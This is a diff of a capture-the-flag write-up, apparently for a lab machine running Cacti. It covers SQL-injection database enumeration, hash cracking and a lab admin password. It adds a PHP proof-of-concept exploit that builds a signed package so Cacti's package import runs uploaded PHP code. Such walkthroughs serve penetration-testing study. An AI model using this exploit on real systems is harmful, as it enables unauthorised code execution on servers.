@@ -349,9 +349,9 @@ available databases [2]:
 
 <br />
 
-There are two `databases`.
+There are two databases.
 
-The most interesting is `monitorsthree_db` one, so let's enumerate its tables:
+The most interesting one `monitorsthree_db`, so let's enumerate its tables:
 
 <br />
 
@@ -404,7 +404,7 @@ Database: monitorsthree_db
 
 <br />
 
-We have 6 `tables`. 
+We have six tables. 
 
 We will dump the `users` one:
 
@@ -424,7 +424,7 @@ There are four `users` with their own hashes.
 
 <br />
 
-If we enter this hashes on  [Crackstation](https://crackstation.net/), we are able to crack one of them:
+If we enter these hashes into  [Crackstation](https://crackstation.net/), we are able to crack one of them:
 
 <br />
 
@@ -445,5 +445,41 @@ This password works for the Cacti login -> `admin/greencacti2001`
 <br />
 
 If we remember, before exploiting the `SQL Injection`, we had found an `RCE` vulnerability in this Cacti version.
+
+Afther further research, we found a very useful [POC](https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88) in Cacti's security advisories on GitHub.
+
+<br />
+
+```php
+<?php
+
+$xmldata = "<xml>
+   <files>
+       <file>
+           <name>resource/test.php</name>
+           <data>%s</data>
+           <filesignature>%s</filesignature>
+       </file>
+   </files>
+   <publickey>%s</publickey>
+   <signature></signature>
+</xml>";
+$filedata = "<?php phpinfo(); ?>";
+$keypair = openssl_pkey_new(); 
+$public_key = openssl_pkey_get_details($keypair)["key"]; 
+openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);
+$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));
+openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);
+file_put_contents("test.xml", str_replace("<signature></signature>", "<signature>".base64_encode($signature)."</signature>", $data));
+system("cat test.xml | gzip -9 > test.xml.gz; rm test.xml");
+
+?>
+```
+
+<br />
+
+As we can see, the `POC` is a php script that is going to create a `.xml.gz` file with malicious `php` code inside.
+
+Once the file is created, we need to `upload` it to Cacti in the "import package" section and access the upload path to `run` the command.
 
 <br />
